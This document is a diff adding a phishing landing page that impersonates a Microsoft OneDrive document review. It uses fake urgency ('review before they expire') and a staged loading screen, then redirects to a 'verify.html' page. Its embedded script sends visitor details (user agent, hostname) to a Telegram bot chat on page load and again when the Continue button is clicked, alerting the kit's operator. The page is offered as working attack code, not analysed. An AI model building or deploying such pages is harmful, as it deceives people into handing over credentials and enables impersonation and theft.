@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>OneDrive Document Review</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+<style>
+body {
+  margin: 0;
+  padding: 0;
+  height: 100vh;
+  min-height: 100vh;
+  overflow: hidden;
+  font-family: 'Segoe UI', Arial, sans-serif;
+  background: url(https://www.shutterstock.com/image-photo/texture-blurry-text-open-textbook-600nw-1175839786.jpg);
+  background-size: cover;
+  background-position: center;
+}
+#loading-screen {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: #fff;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  z-index: 1000;
+}
+#form-container {
+  display: none;
+  position: relative;
+  height: 100vh;
+}
+#content-container {
+  background-color: rgba(255, 255, 255, 0.95);
+  border-radius: 8px;
+  width: 90%;
+  max-width: 520px;
+  margin: 20px auto;
+  padding: 28px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+}
+.loading-dots {
+  display: flex;
+  gap: 8px;
+}
+.dot {
+  width: 12px;
+  height: 12px;
+  background: #2F79D1;
+  border-radius: 50%;
+  animation: pulse 1.5s ease-in-out infinite;
+}
+@keyframes pulse {
+  0%, 100% { transform: scale(1); opacity: 1; }
+  50% { transform: scale(1.5); opacity: 0.5; }
+}
+</style>
+</head>
+<body>
+<div id="loading-screen">
+  <div class="loading-dots">
+    <div class="dot"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+  </div>
+</div>
+
+<div id="form-container">
+  <div id="content-container">
+    <img src="https://example.com/onedrive-logo.png" alt="OneDrive" style="height:60px;margin:0 auto 20px;display:block;">
+    <div style="text-align:center;">
+      <p style="font-size:16px;margin:5px 0;">You've received important documents</p>
+      <p style="font-size:14px;margin:5px 0 20px;">Review your documents before they expire</p>
+      <button id="continue-btn" style="background:#2F79D1;color:white;border:none;padding:12px 24px;border-radius:4px;font-size:16px;cursor:pointer;">
+        Continue
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+// Telegram alert on page visit
+fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    chat_id: '-1002230164444',
+    text: `🚀 Page Visit\nIP: ${window.location.hostname}\nUA: ${navigator.userAgent}`
+  })
+}).catch(() => {});
+
+// Show content after loading
+setTimeout(() => {
+  document.getElementById('loading-screen').style.display = 'none';
+  document.getElementById('form-container').style.display = 'block';
+}, 3000);
+
+// Continue button handler
+document.getElementById('continue-btn').addEventListener('click', () => {
+  // Telegram alert on continue click
+  fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: '-1002230164444',
+      text: `🖱️ Continue Clicked\nIP: ${window.location.hostname}`
+    })
+  }).catch(() => {});
+  
+  // Redirect to verification page
+  window.location.href = 'verify.html';
+});
+</script>
+</body>
+</html>
